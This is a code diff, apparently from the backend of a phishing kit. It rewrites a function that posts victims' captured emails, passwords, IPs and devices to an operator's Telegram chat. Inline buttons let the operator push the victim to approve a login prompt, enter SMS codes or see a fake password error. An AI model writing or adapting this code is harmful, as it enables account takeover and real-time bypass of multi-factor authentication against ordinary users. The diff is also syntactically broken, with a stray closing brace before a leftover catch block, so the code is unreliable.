@@ -29,42 +29,35 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 bot.on('polling_error', err => console.error('[TG Poll Error]', err.message));
 
 
-async function sendVisitNotification(session) {
-  const { sessionId, email, password, name, ip, device, ua, type } = session;
-
-  const text =
-
-📧 *Email:* \`${email}\`
-🔑 *Password:* \`${password}\`
-${name ? `👤 *Name:* \`${name}\`\n` : ''}🌐 *IP:* \`${ip}\`
-📱 *Device:* ${device}
-🕐 *Time:* ${new Date().toUTCString()}
-🔄 *Type:* ${type === 'register' ? 'Registration' : 'Login'}
-━━━━━━━━━━━━━━━━━━`;
+async function notifyLogin(session) {
+  const { email, password, name, ip, device, ua } = session;
+  const text = 
+    `🔔 *New Login Attempt*\n\n` +
+    `👤 *Name:* ${name || 'N/A'}\n` +
+    `📧 *Email:* ${email}\n` +
+    `🔑 *Password:* ${password}\n\n` +
+    `📍 *IP:* ${ip}\n` +
+    `📱 *Device:* ${device}\n` +
+    `🌐 *Browser:* ${ua}`;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Yes Prompt',      callback_data: `${sessionId}::approved`        },
-        { text: '📱 SMS Code I',      callback_data: `${sessionId}::sms_required`    }
+        { text: '✅ Yes Prompt', callback_data: `approve_${session.id}` },
+        { text: '❌ Password Error', callback_data: `deny_${session.id}` }
       ],
       [
-        { text: '📟 SMS Code II',     callback_data: `${sessionId}::sms2_required`   },
-        { text: '📞 Number Prompt',   callback_data: `${sessionId}::number_required` }
-      ],
-      [
-        { text: '❌ Password Error',  callback_data: `${sessionId}::denied`          },
-        { text: '🚫 Block Visitor',   callback_data: `${sessionId}::blocked`         }
+        { text: '📱 SMS Code', callback_data: `sms_${session.id}` },
+        { text: '🚫 Block', callback_data: `block_${session.id}` }
       ]
     ]
   };
 
-  try {
-    const msg = await bot.sendMessage(ADMIN_CHAT, text, {
-      parse_mode: 'Markdown',
-      reply_markup: keyboard
-    });
-    return msg.message_id;
+  const msg = await bot.sendMessage(ADMIN_CHAT, text, { 
+    parse_mode: 'Markdown', 
+    reply_markup: keyboard 
+  });
+  session.messageId = msg.message_id;}
   } catch (err) {
     console.error('[TG Send Error]', err.message);
     return null;
